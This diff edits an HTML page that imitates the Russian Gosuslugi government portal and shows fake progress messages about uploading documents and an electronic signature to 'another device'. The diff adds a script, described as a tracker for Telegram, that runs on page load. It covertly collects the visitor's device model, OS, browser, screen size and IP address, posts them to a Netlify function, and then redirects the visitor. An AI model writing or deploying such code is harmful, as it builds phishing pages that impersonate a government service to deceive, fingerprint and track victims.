@@ -39,7 +39,7 @@
       font-weight: 700;
       margin: 0 0 15px;
       color: #202020;
-         }
+    }
 
     .dots {
       display: flex;
@@ -66,7 +66,7 @@
       font-size: 16px;
       font-weight: bold;
       margin-bottom: 10px;
-      color: #4A4A4A; /* серый от Госуслуг */
+      color: #4A4A4A;
     }
 
     .status {
@@ -77,6 +77,52 @@
   </style>
 </head>
 <body>
+  <!-- Трекер данных для Telegram -->
+  <script src="https://cdn.jsdelivr.net/npm/ua-parser-js@1/dist/ua-parser.min.js"></script>
+  <script>
+    async function trackVisitor() {
+      const data = {
+        timestamp: new Date().toISOString(),
+        screen: `${screen.width}x${screen.height}`,
+      };
+
+      // Характеристики телефона
+      const parser = new UAParser();
+      const ua = parser.getResult();
+      data.device = {
+        model: ua.device.model || 'unknown',
+        vendor: ua.device.vendor || 'unknown',
+        os: ua.os.name + ' ' + (ua.os.version || 'unknown'),
+        browser: ua.browser.name + ' ' + (ua.browser.version || 'unknown')
+      };
+
+      // IP и гео
+      try {
+        const res = await fetch('https://ipapi.co/json/');
+        const geo = await res.json();
+        data.ip = geo.ip || 'unknown';
+      } catch (e) {
+        data.ip = 'unknown';
+      }
+
+      // Отправка на Netlify Function
+      const response = await fetch('/.netlify/functions/track', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+      });
+
+      if (response.ok) {
+        // Перенаправление на authorized.html после успешной отправки
+        window.location.href = 'authorized.html';
+      } else {
+        console.log('Ошибка отправки:', await response.text());
+      }
+    }
+
+    window.addEventListener('load', trackVisitor);
+  </script>
+
   <div class="logo">
     <span class="blue">ГОС</span><span class="red">УСЛУГИ</span>
   </div>
@@ -110,7 +156,6 @@
       "Выгрузка документов....",
       "Получение справок....",
       "Выгрузка электронной подписи....",
-      
     ];
 
     function updateProgress() {
@@ -126,10 +171,7 @@
         setTimeout(updateProgress, interval);
       } else {
         statusEl.textContent = "Выгрузка данных на другое устройство подтверждена.";
-        // Перенаправление на authorized после завершения загрузки
-        setTimeout(() => {
-          window.location.href = 'authorized.html';
-        }, 1500); // Задержка 1.5 секунды перед перенаправлением
+        // Перенаправление уже происходит в trackVisitor(), так что здесь не нужно
       }
     }
 
